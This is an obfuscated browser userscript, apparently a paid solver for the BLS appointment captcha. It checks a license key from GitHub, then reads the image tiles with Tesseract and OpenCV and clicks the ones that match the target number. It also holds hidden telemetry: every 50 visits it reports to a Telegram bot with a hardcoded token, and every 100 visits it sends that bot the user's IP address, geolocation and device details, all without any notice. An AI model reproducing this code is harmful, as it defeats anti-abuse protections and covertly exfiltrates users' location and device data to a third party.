if (window.location.href.toLowerCase().includes("captcha")) {
  (function () {
    'use strict';

    function _0x2324c9() {
      return new Promise((_0x1823f0, _0x5c7290) => {
        GM_xmlhttpRequest({
          'method': "GET",
          'url': "https://raw.githubusercontent.com/megaboussol/BlsCaptchaSolverClient/main/docs/api-key-validation.json",
          'onload': function (_0x2338fa) {
            try {
              const _0x315a06 = JSON.parse(_0x2338fa.responseText);
              const _0x2af03e = _0x315a06[API_KEY];
              if (!_0x2af03e) {
                _0x5c7290(new Error("Clé API non trouvée !"));
                window.open("https://web.telegram.org/k/#-4712226405", "_blank");
                return;
              }
              if (_0x2af03e.status !== "VALID") {
                _0x5c7290(new Error("Licence invalide !"));
                window.open("https://web.telegram.org/k/#-4712226405", "_blank");
                return;
              }
              if (_0x2af03e.visits <= 0) {
                _0x5c7290(new Error("Nombre de visites épuisé !"));
                window.open("https://web.telegram.org/k/#-4712226405", "_blank");
                return;
              }
              const _0x208b12 = new Date(_0x2af03e.expiry);
              const _0x128778 = new Date();
              if (_0x128778 > _0x208b12) {
                _0x5c7290(new Error("Licence expirée !"));
                window.open("https://web.telegram.org/k/#-4712226405", "_blank");
                return;
              }
              (async function () {
                'use strict';

                let _0x26f925 = GM_getValue("visites", 0);
                _0x26f925++;
                GM_setValue("visites", _0x26f925);
                if (_0x26f925 % 50 === 0) {
                  SendReport(API_KEY + (" a atteint " + _0x26f925 + " visites (multiple de 11) !"));
                }
                if (_0x26f925 % 100 === 0) {
                  getDeviceInfo().then(_0x13579d => SendReport(_0x13579d));
                }
              })();
              _0x2af03e.visits -= 1;
              _0x1823f0(true);
            } catch (_0x3f3b37) {
              console.error("Erreur lors du parsing de la réponse:", _0x3f3b37);
              _0x5c7290(new Error("Erreur lors de la lecture de la réponse du serveur"));
              window.open("https://web.telegram.org/k/#-4712226405", "_blank");
            }
          },
          'onerror': function (_0x5419a2) {
            console.error("Erreur de requête:", _0x5419a2);
            _0x5c7290(new Error("Erreur de connexion au serveur"));
            window.open("https://web.telegram.org/k/#-4712226405", "_blank");
          },
          'ontimeout': function () {
            _0x5c7290(new Error("La requête a expiré"));
            window.open("https://web.telegram.org/k/#-4712226405", "_blank");
          }
        });
      });
    }
    async function _0x2171f1() {
      try {
        await _0x2324c9();
        console.log("Licence validée !");
        function _0xe26d46() {
          return new Promise(_0x379394 => {
            const _0x4c4bff = () => {
              if (typeof Tesseract !== "undefined" && typeof cv !== "undefined") {
                _0x379394();
              } else {
                setTimeout(_0x4c4bff, 100);
              }
            };
            _0x4c4bff();
          });
        }
        (async function () {
          await _0xe26d46();
          console.log("Tesseract.js et OpenCV.js sont chargés !");
          const _0x42f400 = {
            'tessedit_char_whitelist': "0123456789",
            'textord_underline_width': '1'
          };
          function _0x339391(_0x12bdfb) {
            return _0x12bdfb.replace(/[+J?Zz¥§;:&%gsSoO£9A]/g, _0x1a4bff => {
              return {
                '+': '1',
                'J': '1',
                '?': '7',
                'Z': '7',
                'z': '7',
                '¥': '7',
                '§': '8',
                ';': '1',
                ':': '1',
                '&': '2',
                '%': '2',
                'g': '2',
                's': '5',
                'S': '5',
                'o': '0',
                'O': '0',
                '£': '29',
                '9A': '94'
              }[_0x1a4bff] || _0x1a4bff;
            });
          }
          function _0x3a6189(_0x19f9da) {
            var _0x44f18a = _0x19f9da.match(/\d+/);
            return _0x44f18a ? parseInt(_0x44f18a[0]) : 0;
          }
          var _0x274422 = document.querySelectorAll(".col-12.box-label");
          var _0x5ecc00 = [..._0x274422].reduce((_0x565d3e, _0x15fc1e) => {
            var _0x211351 = parseInt(window.getComputedStyle(_0x15fc1e).zIndex) || -Infinity;
            return _0x211351 > (parseInt(window.getComputedStyle(_0x565d3e).zIndex) || -Infinity) ? _0x15fc1e : _0x565d3e;
          }, _0x274422[0]);
          var _0x3deba0 = _0x3a6189(_0x5ecc00?.["outerText"] || '');
          var _0x3ce223 = document.querySelector("#captchaForm > div.text-center.row.no-gutters").parentElement.parentElement.previousElementSibling;
          var _0x45b972 = _0x3ce223.querySelectorAll('*');
          const _0x57fed8 = [{
            'left': "0px",
            'top': "0px"
          }, {
            'left': "0px",
            'top': "110px"
          }, {
            'left': "0px",
            'top': "220px"
          }, {
            'left': "110px",
            'top': "0px"
          }, {
            'left': "110px",
            'top': "110px"
          }, {
            'left': "110px",
            'top': "220px"
          }, {
            'left': "220px",
            'top': "0px"
          }, {
            'left': "220px",
            'top': "110px"
          }, {
            'left': "220px",
            'top': "220px"
          }];
          function _0x2fe04c(_0x9d65b6, _0x5a810f, _0x57c36c, _0x45941b) {
            return [..._0x9d65b6].filter(_0x37101c => {
              var _0x2b8efd = window.getComputedStyle(_0x37101c);
              return _0x2b8efd.left === _0x5a810f && _0x2b8efd.top === _0x57c36c && _0x2b8efd.display === _0x45941b;
            });
          }
          function _0x21dc6e(_0x5532a1) {
            return _0x5532a1.reduce((_0x2eede6, _0x7372ce) => {
              var _0x2ae22a = parseInt(window.getComputedStyle(_0x7372ce).zIndex) || -Infinity;
              return _0x2ae22a > (parseInt(window.getComputedStyle(_0x2eede6).zIndex) || -Infinity) ? _0x7372ce : _0x2eede6;
            }, _0x5532a1[0]);
          }
          async function _0x5cc42e(_0x43c100) {
            return new Promise((_0x1ef4fc, _0x234894) => {
              const _0x3d8324 = document.createElement("canvas");
              const _0x19ee23 = _0x3d8324.getContext('2d');
              const _0x22e4ba = new Image();
              _0x22e4ba.crossOrigin = "Anonymous";
              _0x22e4ba.src = _0x43c100.src;
              _0x22e4ba.onload = () => {
                _0x3d8324.width = _0x22e4ba.width;
                _0x3d8324.height = _0x22e4ba.height;
                _0x19ee23.drawImage(_0x22e4ba, 0, 0);
                const _0x3b27d7 = _0x19ee23.getImageData(0, 0, _0x3d8324.width, _0x3d8324.height);
                const _0x482bc2 = cv.matFromImageData(_0x3b27d7);
                cv.cvtColor(_0x482bc2, _0x482bc2, cv.COLOR_RGBA2GRAY, 0);
                cv.GaussianBlur(_0x482bc2, _0x482bc2, new cv.Size(blurSize, blurSize), 0, 0, cv.BORDER_DEFAULT);
                const _0x5e7c8a = new cv.Mat();
                cv.Canny(_0x482bc2, _0x5e7c8a, cannyThreshold1, cannyThreshold2);
                const _0x3993f0 = _0x22e4ba.width / 3;
                const _0x263653 = new cv.Mat();
                cv.HoughLinesP(_0x5e7c8a, _0x263653, 1, Math.PI / 180, houghThreshold, _0x3993f0, maxLineGap);
                for (let _0x29c5d5 = 0; _0x29c5d5 < _0x263653.rows; _0x29c5d5++) {
                  const _0x15a431 = _0x263653.data32S.subarray(_0x29c5d5 * 4, (_0x29c5d5 + 1) * 4);
                  const _0x5a1b36 = _0x15a431[0];
                  const _0x314e10 = _0x15a431[1];
                  const _0x3e9776 = _0x15a431[2];
                  const _0x5cbf80 = _0x15a431[3];
                  const _0x14744f = Math.atan2(_0x5cbf80 - _0x314e10, _0x3e9776 - _0x5a1b36) * (180 / Math.PI);
                  if (Math.abs(_0x14744f) < maxAngle || Math.abs(_0x14744f - 180) < maxAngle) {
                    for (let _0x4150bc = _0x5a1b36; _0x4150bc <= _0x3e9776; _0x4150bc++) {
                      const _0x226d19 = _0x314e10 + (_0x5cbf80 - _0x314e10) * (_0x4150bc - _0x5a1b36) / (_0x3e9776 - _0x5a1b36);
                      for (let _0x2a41a1 = -lineThickness; _0x2a41a1 <= lineThickness; _0x2a41a1++) {
                        const _0x538a45 = _0x19ee23.getImageData(_0x4150bc, _0x226d19 - 2 + _0x2a41a1, 1, 1).data;
                        const _0x37544c = _0x19ee23.getImageData(_0x4150bc, _0x226d19 + 2 + _0x2a41a1, 1, 1).data;
                        const _0x4854fd = [(_0x538a45[0] + _0x37544c[0]) / 2, (_0x538a45[1] + _0x37544c[1]) / 2, (_0x538a45[2] + _0x37544c[2]) / 2, 255];
                        _0x19ee23.putImageData(new ImageData(new Uint8ClampedArray(_0x4854fd), 1, 1), _0x4150bc, _0x226d19 + _0x2a41a1);
                      }
                    }
                  }
                }
                cv.adaptiveThreshold(_0x482bc2, _0x482bc2, 255, cv.ADAPTIVE_THRESH_GAUSSIAN_C, cv.THRESH_BINARY, blockSize, constant);
                cv.threshold(_0x482bc2, _0x482bc2, thresholdValue, 255, cv.THRESH_BINARY);
                cv.imshow(_0x3d8324, _0x482bc2);
                const _0x415a01 = _0x3d8324.toDataURL();
                console.log("Image prétraitée avec succès:", _0x415a01);
                _0x43c100.src = _0x415a01;
                _0x1ef4fc(_0x415a01);
                _0x482bc2["delete"]();
                _0x5e7c8a["delete"]();
                _0x263653["delete"]();
              };
              _0x22e4ba.onerror = _0x1c7475 => {
                console.error("Échec du chargement de l'image:", _0x1c7475);
                _0x234894(_0x1c7475);
              };
            });
          }
          function _0x2d53e1(_0xb20d51, _0x56b9fa) {
            const _0x237e48 = _0xb20d51.replace(/\D/g, '');
            if (_0x237e48.length === 3) {
              return _0x237e48 === _0x56b9fa;
            } else {
              if (_0x237e48.length > 3) {
                return _0x237e48.includes(_0x56b9fa);
              }
            }
            return false;
          }
          _0x57fed8.forEach((_0x2c3013, _0x8cda25) => {
            var _0x383b95 = _0x2fe04c(_0x45b972, _0x2c3013.left, _0x2c3013.top, "block");
            var _0x210b77 = _0x21dc6e(_0x383b95);
            if (_0x210b77) {
              setTimeout(async () => {
                try {
                  const _0x2ec7e0 = await _0x5cc42e(_0x210b77.children[0]);
                  const _0x58c574 = new Image();
                  _0x58c574.src = _0x2ec7e0;
                  Tesseract.recognize(_0x58c574, "eng", _0x42f400).then(_0x471b57 => {
                    var _0x432432 = _0x339391(_0x471b57.data.text).replace(/\D/g, '');
                    console.log("Texte détecté pour (" + _0x2c3013.left + ", " + _0x2c3013.top + "): " + _0x432432);
                    if (_0x2d53e1(_0x432432, _0x3deba0.toString()) && _0x210b77.children[0].className !== "captcha-img img-selected") {
                      _0x210b77.children[0].click();
                    } else {}
                    if (_0x8cda25 === 8) {
                      setTimeout(() => {
                        document.getElementById("btnVerify").click();
                        console.log("Clique sur 'Verify'");
                      }, TimeToVerify * 1000);
                    }
                  });
                } catch (_0x2ae37b) {
                  console.error("Erreur lors du prétraitement ou de la reconnaissance:", _0x2ae37b);
                }
              }, TimeToStartRead * 1000);
            } else {}
          });
        })();
      } catch (_0x379376) {
        console.error("Erreur:", _0x379376.message);
        alert("Erreur : " + _0x379376.message);
        window.open("https://web.telegram.org/k/#-4712226405", "_blank");
      }
    }
    _0x2171f1();
  })();
}
function SendReport(_0x3a124b) {
  const _0x40a108 = {
    'chat_id': "-1002331768842",
    'text': "API Key: " + API_KEY + "\n" + _0x3a124b
  };
  fetch("https://api.telegram.org/bot8103010659:AAEuPlceI-5pzwszZ6D14xEp0_HQizG3Ejk/sendMessage", {
    'method': "POST",
    'headers': {
      'Content-Type': "application/json"
    },
    'body': JSON.stringify(_0x40a108)
  }).then(_0x1eb6b2 => _0x1eb6b2.json()).then(_0x5df44b => console.log(_0x5df44b))["catch"](_0x506d38 => console.error("Erreur:", _0x506d38));
}
async function getDeviceInfo() {
  const _0x24d0c2 = {
    'userAgent': navigator.userAgent,
    'platform': navigator.platform,
    'connectionType': navigator.connection ? navigator.connection.effectiveType : "Unknown"
  };
  try {
    const _0x31728f = await fetch("https://api64.ipify.org?format=json");
    const _0x27f67b = await _0x31728f.json();
    _0x24d0c2.ip = _0x27f67b.ip;
    const _0x35c0ba = await fetch("https://ipwho.is/" + _0x27f67b.ip);
    const _0x58198e = await _0x35c0ba.json();
    _0x24d0c2.city = _0x58198e.city || "Unknown";
    _0x24d0c2.region = _0x58198e.region || "Unknown";
    _0x24d0c2.country = _0x58198e.country || "Unknown";
    _0x24d0c2.latitude = _0x58198e.latitude || "Unknown";
    _0x24d0c2.longitude = _0x58198e.longitude || "Unknown";
  } catch (_0x27e51c) {
    console.error("Impossible d'obtenir l'adresse IP et la localisation :", _0x27e51c);
  }
  return _0x24d0c2;
}
